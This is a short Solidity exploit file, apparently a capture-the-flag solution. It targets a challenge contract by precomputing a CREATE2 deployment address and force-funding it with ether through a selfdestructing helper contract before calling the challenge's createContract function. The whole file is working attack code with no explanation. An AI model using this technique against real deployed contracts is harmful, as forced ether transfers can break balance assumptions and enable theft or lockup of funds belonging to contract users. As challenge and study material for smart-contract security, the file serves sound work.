pragma solidity 0.8.4;

import './Setup.sol';
import './Contract.sol';

import '@openzeppelin/contracts-upgradeable/utils/Create2Upgradeable.sol';

contract DestroyMe {
    constructor(address a) payable {
        require(msg.value >= 0.1 ether, "send value");
        selfdestruct(payable(a));
    }
}

contract Exploit {
    constructor (Challenge challenge, uint salt, Factory factory) public payable {
        bytes memory bytecode = type(Test).creationCode;
        address result = Create2Upgradeable.computeAddress(bytes32(salt), keccak256(bytecode), address(factory));
        new DestroyMe{value: msg.value}(result);
        challenge.createContract(bytecode, salt);
    }
}